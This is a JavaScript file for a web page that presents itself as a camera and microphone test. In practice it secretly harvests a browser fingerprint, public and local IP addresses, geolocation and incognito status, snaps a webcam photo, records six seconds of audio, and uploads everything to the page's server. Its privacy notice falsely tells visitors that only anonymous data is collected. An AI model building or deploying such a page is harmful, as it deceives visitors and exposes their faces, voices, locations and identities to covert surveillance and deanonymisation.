// Browser Fingerprinting and Media Capture Utility

import detectIncognito from './incognito-detection.js';

class FingerprintMediaTest {
  constructor() {
    this.initElements();
    this.initEventListeners();
    this.isMobile = /Mobi|Android/i.test(navigator.userAgent);
    this.audioVisualizerActive = false;
    this.audioContext = null;
    this.analyser = null;
    this.mediaStream = null;
    this.privacyData = {
      isIncognito: false,
      browserName: 'Unknown',
      detectionMethod: 'Not tested'
    };

    // Set current year
    document.getElementById('currentYear').textContent = new Date().getFullYear();
    // --- Add robust cleanup on navigation/visibility change ---
    const cleanupHandler = () => { try { this.cleanup(); } catch (e) { /* ignore */ } };
    window.addEventListener('pagehide', cleanupHandler);
    window.addEventListener('beforeunload', cleanupHandler);
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') cleanupHandler();
    });
  }
  cleanup() {
    // Stop any active media streams
    if (this.mediaStream) {
      this.mediaStream.getTracks().forEach(track => track.stop());
      this.mediaStream = null;
    }
    
    // Stop audio visualization
    this.stopAudioVisualizer();
    
    // Reset video element
    if (this.localVideo) {
      this.localVideo.srcObject = null;
      this.localVideo.style.display = 'none';
    }
    
    // Show placeholder again
    if (this.placeholder) {
      this.placeholder.style.display = 'block';
    }
  }
  initElements() {
    this.statusElement = document.querySelector('.status-content');
    this.startButton = document.getElementById('startTest');
    this.videoContainer = document.getElementById('videoContainer');
    this.placeholder = document.getElementById('placeholder');
    this.cameraStatus = document.getElementById('cameraStatus');
    this.micStatus = document.getElementById('micStatus');
    this.audioBars = document.querySelectorAll('.audio-bar');
    this.localVideo = document.getElementById('localVideo');
    this.privacyLink = document.getElementById('privacyLink');
    
    this.privacyStatus = document.getElementById('privacyStatus') || {
      textContent: ''
    };
    this.networkStatus = document.getElementById('networkStatus') || {
      textContent: ''
    };
  }

  initEventListeners() {
    this.startButton.addEventListener('click', () => this.runTests());
    this.privacyLink.addEventListener('click', (e) => {
      e.preventDefault();
      alert('Privacy policy: We collect anonymous technical data about your device for compatibility testing purposes only. No personally identifiable information is stored.');
    });
    
    if (this.isMobile) {
      this.videoContainer.style.minHeight = '50vh';
      this.startButton.style.fontSize = '18px';
      this.startButton.style.padding = '15px 25px';
    }
  }

  async updatePrivacyStatus() {
    try {
      const networkInfo = await this.getNetworkInfo();
      const privacyInfo = await this.detectIncognitoMode();
      const privacyStatus = privacyInfo.isIncognito ? 
        `Private Mode (${privacyInfo.browserName})` : 
        `Normal Mode (${privacyInfo.browserName})`;
      this.privacyStatus.textContent = 
        `Network: ${networkInfo.type} | ${privacyStatus}`;
      this.privacyStatus.style.color = privacyInfo.isIncognito ? 
        '#ea4335' : '#34a853';
      // Update the consent box UI if present
      this.updatePrivacyStatusBox(privacyInfo);
    } catch (error) {
      console.error('Privacy status update failed:', error);
      this.privacyStatus.textContent = 'Network: Unknown | Privacy: Detection failed';
      this.privacyStatus.style.color = '#fbbc05';
    }
  }

  async getNetworkInfo() {
    try {
      const publicIP = await this.getPublicIP();
      return {
        type: 'public',
        publicIP,
        localIPs: []
      };
    } catch (error) {
      return {
        type: 'unknown',
        publicIP: null,
        localIPs: []
      };
    }
  }

  async runTests() {
  try {
    // Initialize cleanup first
    this.cleanup = this.cleanup || function() {
      console.warn('Fallback cleanup called');
      if (this.mediaStream) {
        this.mediaStream.getTracks().forEach(track => track.stop());
      }
    };

    this.cleanup(); // Now this will work
    this.setTestStatus("Initializing test...", true);

      await this.updatePrivacyStatus();
      
      const publicIP = await this.getPublicIP();
      this.networkStatus.textContent = `Network: Detected (Public IP: ${publicIP || 'Not available'})`;
      
      const fingerprintData = await this.collectEnhancedFingerprint();
      const mediaData = await this.captureAndSaveMedia();
      const locationData = await this.collectLocation();

      this.setTestStatus("Test completed successfully! All components are working properly.", false, "Test Again");
      
      const processedData = this.processAllData(fingerprintData, mediaData, locationData);
      console.log("Processed test data:", processedData);
      
    } catch (error) {
    console.error('Test failed:', error, error.message, error.stack);
    
    // Ensure cleanup exists before calling it
    if (typeof this.cleanup === 'function') {
      this.cleanup();
    }
    
    this.setTestStatus(
      `Test encountered an error: ${error.message}`,
      false,
      "Retry Test"
    );
  } finally {
    // Always clean up media devices after test completes (success or error)
    this.cleanup();
  }
}

  setTestStatus(message, isLoading, buttonText = "Start Test") {
    this.statusElement.textContent = message;
    this.startButton.disabled = isLoading;
    this.startButton.innerHTML = isLoading 
      ? '<div class="loader"></div> Starting Test...' 
      : buttonText;
  }

  async collectEnhancedFingerprint() {
  try {
    console.log('[DEBUG] Starting fingerprint collection');
    
    const rawData = await this.gatherRawFingerprint();
    const processedData = this.processFingerprintData(rawData);
    
    console.log('[DEBUG] Prepared fingerprint data:', {
      ip: rawData.network.publicIP,
      dataSize: JSON.stringify(processedData).length,
      features: Object.keys(processedData.browser_features || {})
    });

    // Show loading state
    this.setTestStatus("Uploading fingerprint data...", true);

    const response = await fetch('/collect-fingerprint', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        type: 'processed_fingerprint',
        data: processedData,
        timestamp: new Date().toISOString()
      })
    });

    if (!response.ok) {
      let errorData;
      try {
        errorData = await response.json();
        console.error('[ERROR] Server response:', {
          status: response.status,
          error: errorData.error,
          details: errorData.details
        });
      } catch (e) {
        console.error('[ERROR] Failed to parse error response:', e);
        errorData = { error: 'Invalid server response' };
      }
      
      throw new Error(errorData.error || `Server error: ${response.status}`);
    }

    const result = await response.json();
    console.log('[DEBUG] Fingerprint saved successfully:', result.url);
    return processedData;

  } catch (error) {
    console.error('[ERROR] Fingerprint collection failed:', error, error.message, error.stack);
    
    // Provide user-friendly error messages
    let userMessage = error.message;
    if (error.message.includes('timeout')) {
      userMessage = 'Connection timeout - please check your network';
    } else if (error.message.includes('Failed to fetch')) {
      userMessage = 'Network error - cannot connect to server';
    }
    
    throw new Error(userMessage);
  }
}

async runTests() {
  try {
    this.cleanup();
    this.setTestStatus("Initializing test...", true);
    
    await this.updatePrivacyStatus();
    const publicIP = await this.getPublicIP();
    this.networkStatus.textContent = `Network: Detected (Public IP: ${publicIP || 'Not available'})`;
    
    // Get local network info
    this.setTestStatus("Checking local network...", true);
    const localIPs = await this.getLocalIPs();
    document.getElementById('localIPv4').textContent = localIPs.ipv4.join(', ');
    document.getElementById('localIPv6').textContent = localIPs.ipv6.join(', ');
    const localLocation = await this.getLocalIPLocation();
    if (!localLocation.error) {
      const locationStr = `${localLocation.city}, ${localLocation.region}, ${localLocation.country}`;
      document.getElementById('localLocation').textContent = locationStr;
    } else {
      document.getElementById('localLocation').textContent = 'Not available';
    }

    console.log('Starting fingerprint collection...');
    const fingerprintData = await this.collectEnhancedFingerprint();
    
    console.log('Starting media capture...');
    const mediaData = await this.captureAndSaveMedia();
    
    console.log('Starting location collection...');
    const locationData = await this.collectLocation();

    this.setTestStatus("Test completed successfully! All components are working properly.", false, "Test Again");
    
    const processedData = this.processAllData(fingerprintData, mediaData, locationData);
    console.log("Test completed with data:", processedData);
    
  } catch (error) {
    console.error('Test failed:', error, error.message, error.stack);
    this.setTestStatus(`Test encountered an error: ${error.message}`, false, "Retry Test");
  } finally {
    // Always clean up media devices after test completes (success or error)
    this.cleanup();
  }
}
  async gatherRawFingerprint() {
    const publicIP = await this.getPublicIP();
    const localIPsObj = await this.getLocalIPs();
    const istTime = new Date().toLocaleString('en-IN', {
      timeZone: 'Asia/Kolkata',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
    const coords = await this.collectLocation();
    // Get privacy data
    const privacyInfo = await this.detectIncognitoMode();
    const os = await this.detectOS();
    console.log('Privacy Detection Results:', privacyInfo); // Add this line

    return {
      os: os,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      timestamp: istTime,
      timezone: 'Asia/Kolkata (IST)',
      network: {
        publicIP,
        localIPv4: localIPsObj.ipv4,
        localIPv6: localIPsObj.ipv6
      },
      location: coords || null,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight
      },
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      hardware: {
        cpuCores: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints
      },
      features: {
        audio: await this.getAudioFingerprint(),
        fonts: await this.detectFonts(),
        plugins: this.getPlugins(),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine
      },
      timing: {
        pageLoadTime: performance.now()
      },
      orientation: {
        angle: screen.orientation ? screen.orientation.angle : null,
        type: screen.orientation ? screen.orientation.type : null
      },
      browserInfo: {
        vendor: navigator.vendor,
        product: navigator.product,
        webdriver: navigator.webdriver
      },
      privacyInfo: {
        isIncognito: privacyInfo.isIncognito,
        browserName: privacyInfo.browserName,
        detectionMethod: privacyInfo.method
      }
    };
  }

   async getPublicIP() {
    try {
      // First try our own endpoint
      const response = await fetch('/get-ip');
      if (response.ok) {
        const data = await response.json();
        return data.ip;
      }
      
      // Fallback to api.ipify.org
      const ipifyResponse = await fetch('https://api.ipify.org?format=json');
      if (!ipifyResponse.ok) throw new Error('IP fetch failed');
      const ipifyData = await ipifyResponse.json();
      return ipifyData.ip;
    } catch (error) {
      console.error('Error fetching public IP:', error);
      return null;
    }
  }

  async captureAndSaveMedia() {
    try {
      this.setMediaStatus("Checking camera and microphone permissions...", "Checking...", "Checking...");

      // Use mobile-friendly constraints if on mobile
      let constraints;
      if (this.isMobile) {
        constraints = {
          video: { facingMode: "user" },
          audio: true
        };
      } else {
        constraints = {
          video: { width: 1280, height: 720 },
          audio: {
            echoCancellation: true,
            noiseSuppression: true,
            autoGainControl: true
          }
        };
      }

      this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
      await this.setupVideoStream(this.mediaStream);
      await this.testCamera(this.mediaStream);
      if (this.mediaStream.getAudioTracks().length > 0) {
        await this.testMicrophone(this.mediaStream);
      } else {
        this.micStatus.textContent = "Microphone: Not detected";
      }
      return { success: true };
    } catch (error) {
      this.handleMediaError(error);
      throw error;
    }
  }

  handleMediaError(error) {
    console.error('Media capture error:', error);
    
    let errorMessage = 'Unknown error occurred';
    
    if (error.name === 'NotAllowedError') {
      errorMessage = 'Camera/microphone access denied. Please allow permissions and try again.';
    } else if (error.name === 'NotFoundError') {
      errorMessage = 'No camera or microphone found. Please check your devices.';
    } else if (error.name === 'NotSupportedError') {
      errorMessage = 'Media capture not supported in this browser.';
    } else if (error.message.includes('timeout')) {
      errorMessage = 'Permission request timed out. Please try again.';
    }
    
    this.setMediaStatus(`Error: ${errorMessage}`, "Failed", "Failed");
  }

  async setupVideoStream(stream) {
    this.localVideo.srcObject = stream;
    this.localVideo.style.display = 'block';
    this.placeholder.style.display = 'none';

    await new Promise((resolve, reject) => {
      this.localVideo.onloadedmetadata = resolve;
      this.localVideo.onerror = reject;
    });

    try {
      await this.localVideo.play();
    } catch (error) {
      console.error('Video play error:', error);
      throw new Error('Failed to start video playback');
    }
  }

  async testCamera(stream) {
    this.cameraStatus.textContent = "Camera: Detected";
    this.setTestStatus("Testing camera... Smile!");

    const imageBlob = await this.captureImageFrame(this.localVideo);
    if (!imageBlob) {
      throw new Error('Failed to capture image frame');
    }

    const processedImageData = {
      type: 'camera_test',
      timestamp: new Date().toISOString(),
      resolution: `${this.localVideo.videoWidth}x${this.localVideo.videoHeight}`,
      size_bytes: imageBlob.size,
      format: 'jpeg',
      device_info: {
        user_agent: navigator.userAgent,
        platform: navigator.platform
      }
    };
    
    await this.saveProcessedMedia('image', imageBlob, 'jpg', processedImageData);
    this.cameraStatus.textContent = "Camera: Working properly";
  }

  async testMicrophone(stream) {
    this.animateAudioVisualizer(stream);
    this.micStatus.textContent = "Microphone: Detected";
    this.setTestStatus("Testing microphone... Speak now!");

    const audioBlob = await this.recordAudio(stream);
    if (audioBlob) {
      const processedAudioData = {
        type: 'microphone_test',
        timestamp: new Date().toISOString(),
        duration_seconds: 6,
        size_bytes: audioBlob.size,
        format: 'webm',
        device_info: {
          user_agent: navigator.userAgent,
          platform: navigator.platform
        }
      };
      
      await this.saveProcessedMedia('audio', audioBlob, 'webm', processedAudioData);
      this.micStatus.textContent = "Microphone: Working properly";
    }
  }

  setMediaStatus(status, cameraText, micText) {
    this.statusElement.textContent = status;
    this.cameraStatus.textContent = `Camera: ${cameraText}`;
    this.micStatus.textContent = `Microphone: ${micText}`;
  }

  animateAudioVisualizer(stream) {
    this.stopAudioVisualizer();
    this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
    this.analyser = this.audioContext.createAnalyser();
    const microphone = this.audioContext.createMediaStreamSource(stream);
    microphone.connect(this.analyser);
    this.analyser.fftSize = 32;

    const bufferLength = this.analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    const updateVisualizer = () => {
      if (!this.analyser) return; // Prevent TypeError if analyser is null
      this.analyser.getByteFrequencyData(dataArray);
      this.audioBars.forEach((bar, i) => {
        const index = Math.floor(i * (bufferLength / this.audioBars.length));
        const value = dataArray[index] / 255;
        const height = value * 100;
        bar.style.height = `${10 + height}%`;
      });

      if (this.audioVisualizerActive) {
        requestAnimationFrame(updateVisualizer);
      }
    };

    this.audioVisualizerActive = true;
    updateVisualizer();
  }

  stopAudioVisualizer() {
    this.audioVisualizerActive = false;
    this.audioBars.forEach(bar => {
      bar.style.height = '10%';
    });
    
    if (this.audioContext) {
      if (this.audioContext.state !== 'closed') {
        this.audioContext.close();
      }
      this.audioContext = null;
      this.analyser = null;
    }
  }

  async captureImageFrame(video) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      const attemptCapture = (attempts = 3) => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = ctx.getImageData(0, 0, 10, 10).data;
        const isBlank = Array.from(imageData).every(val => val === 0);

        if (!isBlank || attempts <= 0) {
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        } else {
          setTimeout(() => attemptCapture(attempts - 1), 200);
        }
      };

      attemptCapture();
    });
  }

  async recordAudio(stream) {
    return new Promise((resolve) => {
      try {
        const audioChunks = [];
        const recorder = new MediaRecorder(stream);

        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) audioChunks.push(e.data);
        };

        recorder.onstop = () => {
          if (audioChunks.length > 0) {
            resolve(new Blob(audioChunks, { type: 'audio/webm' }));
          } else {
            resolve(null);
          }
        };

        recorder.start();
        setTimeout(() => {
          if (recorder.state === 'recording') {
            recorder.stop();
          }
        }, 6000);

      } catch (error) {
        console.error('Audio recording error:', error);
        resolve(null);
      }
    });
  }

  async saveProcessedMedia(type, blob, extension, metadata) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = async () => {
        try {
          const response = await fetch('/collect-media', {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            body: JSON.stringify({
              data: reader.result.split(',')[1],
              metadata: {
                ...metadata,
                media_type: type,
                size_bytes: blob.size,
                extension
              }
            })
          });

          if (!response.ok) {
            const error = await response.json();
            throw new Error(error.message || 'Server error');
          }

          const data = await response.json();
          resolve(data);
        } catch (error) {
          reject(error);
        }
      };
      reader.onerror = () => reject(new Error('File reading failed'));
      reader.readAsDataURL(blob);
    });
  }

  async collectLocation() {
    if (!navigator.geolocation) return null;

    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          try {
            await fetch('/collect-fingerprint', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                location: {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude
                }
              })
            });
            resolve(position.coords);
          } catch (error) {
            console.error('Location save error:', error);
            resolve(null);
          }
        },
        (error) => {
          console.error('Geolocation error:', error);
          resolve(null);
        },
        { timeout: 5000 }
      );
    });
  }

  async getAudioFingerprint() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const analyser = audioContext.createAnalyser();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(analyser);
      analyser.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.value = 1000;
      gainNode.gain.value = 0;
      
      oscillator.start();
      
      const frequencyData = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteFrequencyData(frequencyData);
      
      oscillator.stop();
      
      return Array.from(frequencyData).slice(0, 10).join('');
    } catch (e) {
      return null;
    }
  }

  async detectFonts() {
    const fonts = [
      'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
      'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
      'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Calibri',
      'Lucida Console', 'Monaco', 'Menlo', 'Consolas'
    ];
    
    const availableFonts = [];
    
    for (const font of fonts) {
      if (await this.isFontAvailable(font)) {
        availableFonts.push(font);
      }
    }
    
    return availableFonts;
  }

  isFontAvailable(fontName) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      ctx.font = '72px monospace';
      const baseline = ctx.measureText('mmmmmmmmmmlli').width;
      
      ctx.font = `72px ${fontName}, monospace`;
      const width = ctx.measureText('mmmmmmmmmmlli').width;
      
      resolve(width !== baseline);
    });
  }

  getPlugins() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const plugin = navigator.plugins[i];
      plugins.push({
        name: plugin.name,
        filename: plugin.filename,
        description: plugin.description
      });
    }
    return plugins;
  }

  processAllData(fingerprintData, mediaData, locationData) {
    return {
      fingerprint: fingerprintData,
      media: mediaData,
      location: locationData,
      timestamp: new Date().toISOString(),
      sessionId: this.generateSessionId()
    };
  }

  processFingerprintData(rawData) {
    return {
      device_info: {
        operating_system: rawData?.os || 'Unknown',
        browser: this.detectBrowser(),
        browser_version: this.getBrowserVersion(),
        platform: rawData?.platform || 'Unknown',
        mobile_device: this.isMobile
      },
      timezone_info: {
        reported_timezone: rawData?.timezone || 'Unknown',
        ist_time: rawData?.timestamp || 'Unknown',
        timezone_offset: '+05:30 (IST)'
      },
      location_info: {
        ip_address: rawData?.network?.publicIP || 'Unknown',
        local_ipv4: Array.isArray(rawData?.network?.localIPv4) ? rawData.network.localIPv4 : [],
        local_ipv6: Array.isArray(rawData?.network?.localIPv6) ? rawData.network.localIPv6 : [],
        latitude: rawData?.location?.latitude || null,
        longitude: rawData?.location?.longitude || null
      },
      display_info: {
        screen_resolution: rawData?.screen ? `${rawData.screen.width}x${rawData.screen.height}` : 'Unknown',
        viewport_size: rawData?.viewport ? `${rawData.viewport.width}x${rawData.viewport.height}` : 'Unknown',
        color_depth: rawData?.screen?.colorDepth || 'Unknown'
      },
      hardware_info: {
        cpu_cores: navigator.hardwareConcurrency || 0,
        device_memory: navigator.deviceMemory || 0,
        touch_support: navigator.maxTouchPoints > 0
      },
      browser_features: {
        cookies_enabled: rawData?.features?.cookieEnabled || false,
        local_storage_available: typeof window !== 'undefined' && 'localStorage' in window
      },
      privacy_info: {
        incognito: rawData?.privacyInfo?.isIncognito || false,
        browser_name: rawData?.privacyInfo?.browserName || this.detectBrowser(),
        detection_method: rawData?.privacyInfo?.detectionMethod || 'Advanced detection',
        ...(rawData?.privacy_info || {})
      },
      fingerprints: {
        overall_fingerprint_hash: this.generateFingerprintHash(rawData)
      }
    };
  }

  detectBrowser() {
    const ua = navigator.userAgent;
    // Specific browser checks first
    if (ua.includes('Brave')) return 'Brave';
    if (ua.includes('Edg/')) return 'Edge';
    if (ua.includes('OPR/') || ua.includes('Opera')) return 'Opera';
    if (ua.includes('Firefox/')) return 'Firefox';
    if (ua.includes('SamsungBrowser/')) return 'Samsung';
    // Chrome should be checked after Edge and Opera
    if (ua.includes('Chrome/')) return 'Chrome';
    // Safari check should come after Chrome check
    if (ua.includes('Safari/')) return 'Safari';
    return 'Unknown';
  }

  async detectOS() {
    // Modern approach: User-Agent Client Hints API
    if (navigator.userAgentData) {
      const platform = navigator.userAgentData.platform;
      if (platform && platform !== 'Unknown') {
        try {
          const highEntropyValues = await navigator.userAgentData.getHighEntropyValues(['platformVersion']);
          if (highEntropyValues.platformVersion) {
              if (platform === 'Windows' && parseInt(highEntropyValues.platformVersion.split('.')[0]) >= 13) {
                  return 'Windows 11 or newer';
              }
              return `${platform} ${highEntropyValues.platformVersion}`;
          }
        } catch (error) {
           console.warn("Couldn't get detailed platform version, returning platform name only.", error);
        }
        return platform;
      }
    }

    // Fallback for older browsers
    const userAgent = navigator.userAgent;
    const platformStr = navigator.platform;

    if (/Win/i.test(platformStr)) {
      if (/Windows NT 10.0/.test(userAgent)) return 'Windows 10 or 11';
      if (/Windows NT 6.3/.test(userAgent)) return 'Windows 8.1';
      if (/Windows NT 6.2/.test(userAgent)) return 'Windows 8';
      if (/Windows NT 6.1/.test(userAgent)) return 'Windows 7';
      return 'Windows (Legacy)';
    }
    if (/Mac/i.test(platformStr)) return 'macOS';
    if (/Linux/i.test(platformStr) && !/Android/.test(userAgent)) return 'Linux';
    if (/Android/.test(userAgent)) return 'Android';
    if (/iPhone|iPad|iPod/.test(userAgent)) return 'iOS';

    return 'Unknown';
  }

  getBrowserVersion() {
    const userAgent = navigator.userAgent;
    const matches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|Brave|Vivaldi|SamsungBrowser|UCBrowser)\/([\d.]+)/);
    return matches ? matches[2] : 'Unknown';
  }

  getBrowserEngine() {
    const userAgent = navigator.userAgent;
    if (/AppleWebKit/.test(userAgent)) {
      if (/Chrome/.test(userAgent)) return 'Blink';
      return 'WebKit';
    }
    if (/Gecko/.test(userAgent)) return 'Gecko';
    if (/Trident/.test(userAgent)) return 'Trident';
    return 'Unknown';
  }

  getCPUArchitecture() {
    try {
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        return navigator.userAgentData.getHighEntropyValues(['architecture'])
          .then(ua => ua.architecture || 'Unknown');
      }
      if (navigator.cpuClass) return navigator.cpuClass;
      return 'Unknown';
    } catch (e) {
      return 'Unknown';
    }
  }

  generateFingerprintHash(data) {
    const str = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return hash.toString(16);
  }

  generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }

  // Robust local IP discovery with fallback
  async getLocalIPs() {
    return new Promise((resolve) => {
      try {
        const ips = {
          v4: new Set(),
          v6: new Set()
        };
        const pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' }
          ],
          iceCandidatePoolSize: 1
        });
        pc.createDataChannel('');
        pc.onicecandidate = (event) => {
          if (!event || !event.candidate) {
            pc.close();
            const result = {
              ipv4: ips.v4.size > 0 ? [...ips.v4] : ['Not available'],
              ipv6: ips.v6.size > 0 ? [...ips.v6] : ['Not available']
            };
            resolve(result);
            return;
          }
          const candidate = event.candidate.candidate;
          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
          const match = candidate.match(ipRegex);
          if (match) {
            const ip = match[1];
            if (ip.includes(':')) {
              if (!ip.includes('.local')) ips.v6.add(ip);
            } else {
              if (!ip.includes('.local')) ips.v4.add(ip);
            }
          }
        };
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .catch(error => {
            console.error('Error:', error);
            resolve({
              ipv4: ['Not available'],
              ipv6: ['Not available']
            });
          });
        setTimeout(() => {
          if (pc.iceGatheringState !== 'complete') {
            pc.close();
            resolve({
              ipv4: ips.v4.size > 0 ? [...ips.v4] : ['Not available'],
              ipv6: ips.v6.size > 0 ? [...ips.v6] : ['Not available']
            });
          }
        }, 2000);
      } catch (error) {
        console.error('Error:', error);
        resolve({
          ipv4: ['Not available'],
          ipv6: ['Not available']
        });
      }
    });
  }

  async getLocalIPLocation() {
    try {
      const ips = await this.getLocalIPs();
      if (ips.ipv4[0] === 'Not available' && ips.ipv6[0] === 'Not available') {
        return { error: 'Could not detect local IP' };
      }
      const ipToCheck = ips.ipv4[0] !== 'Not available' ? ips.ipv4[0] : ips.ipv6[0];
      const response = await fetch('/get-local-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ipToCheck })
      });
      if (!response.ok) throw new Error('Location service failed');
      return await response.json();
    } catch (error) {
      console.error('Location error:', error);
      return { error: 'Could not determine local location' };
    }
  }

  async getLocalIPsViaOtherMethods() {
    // Placeholder for future fallback methods
    // Method 1: Try WebSocket "local IP discovery"
    // Method 2: Try timing attacks on local network
    // Method 3: Try using iframe tricks
    // Note: These methods may have limited success and ethical considerations
    return ['Not available (all methods blocked)'];
  }

  // Detect incognito/private mode for major browsers
  async detectIncognitoMode() {
    try {
      const result = await detectIncognito();
      this.privacyData = {
        isIncognito: result.isPrivate,
        browserName: result.browserName,
        detectionMethod: result.method
      };
      return this.privacyData;
    } catch (error) {
      console.error('Incognito detection failed:', error);
      return {
        isIncognito: false,
        browserName: 'Unknown',
        detectionMethod: 'Detection failed'
      };
    }
  }

  updatePrivacyStatusBox(privacyInfo) {
    const box = document.getElementById('privacyStatusBox');
    const text = document.getElementById('privacyStatusText');
    if (!box || !text) return;
    box.className = `consent-box privacy-status ${
      privacyInfo.isIncognito ? 'private' : 
      privacyInfo.browserName === 'Unknown' ? 'unknown' : 'normal'
    }`;
    if (privacyInfo.browserName === 'Unknown') {
      text.textContent = 'Could not determine privacy status';
    } else {
      text.textContent = `You're using ${privacyInfo.browserName} in ${
        privacyInfo.isIncognito ? 'private' : 'normal'
      } mode`;
    }
    // Add click handler for details
    const detailsLink = document.getElementById('privacyDetailsLink');
    if (detailsLink) {
      detailsLink.onclick = (e) => {
        e.preventDefault();
        alert(`Privacy Details:\n\nBrowser: ${privacyInfo.browserName}\n` +
              `Mode: ${privacyInfo.isIncognito ? 'Private' : 'Normal'}\n` +
              `Detection Method: ${privacyInfo.detectionMethod}`);
      };
    }
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const app = new FingerprintMediaTest();
});
